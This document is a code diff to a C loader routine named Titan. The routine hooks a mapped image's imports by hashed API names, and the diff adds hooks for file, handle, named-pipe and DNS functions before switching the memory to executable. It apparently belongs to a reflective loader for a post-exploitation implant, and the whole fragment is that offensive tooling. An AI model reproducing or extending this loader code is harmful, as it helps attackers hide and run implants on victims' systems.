@@ -116,12 +116,17 @@ D_SEC( B ) VOID WINAPI Titan( VOID )
 				
 				#if defined( _WIN64 )
 				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x0e07cd7e, PTR_TO_HOOK( Mem, Sleep_Hook ) );
+				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x84d15061, PTR_TO_HOOK( Mem, ReadFile_Hook ) );
+				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xf1d207d0, PTR_TO_HOOK( Mem, WriteFile_Hook ) );
+				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xfdb928e7, PTR_TO_HOOK( Mem, CloseHandle_Hook ) );
+				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x436e4c62, PTR_TO_HOOK( Mem, ConnectNamedPipe_Hook ) );
+				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xa05e2a6d, PTR_TO_HOOK( Mem, CreateNamedPipeA_Hook ) );
 				#endif
 
 				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x4b184b05, PTR_TO_HOOK( Mem, HeapFree_Hook ) );
 				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xadc4062e, PTR_TO_HOOK( Mem, HeapAlloc_Hook ) );
 				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xc165d757, PTR_TO_HOOK( Mem, ExitThread_Hook ) );
-				//LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x8641aec0, PTR_TO_HOOK( Mem, DnsQuery_A_Hook ) );
+				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x8641aec0, PTR_TO_HOOK( Mem, DnsQuery_A_Hook ) );
 				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x3a5fb425, PTR_TO_HOOK( Mem, HeapReAlloc_Hook ) );
 				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x98baab11, PTR_TO_HOOK( Mem, CreateThread_Hook ) );
 				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xdecfc1bf, PTR_TO_HOOK( Mem, GetProcAddress_Hook ) );
@@ -156,6 +161,9 @@ D_SEC( B ) VOID WINAPI Titan( VOID )
 
 				/* Initiliaze heap list header */
 				InitializeListHead( &Tbl->Table->HeapList );
+
+				/* Initialize pipe list header */
+				InitializeListHead( &Tbl->Table->PipeList );
 
 				/* Change Memory Protection. */
 				if ( NT_SUCCESS( Api.NtProtectVirtualMemory( NtCurrentProcess(), &Mem, &SLn, PAGE_EXECUTE_READ, &Prm ) ) ) {
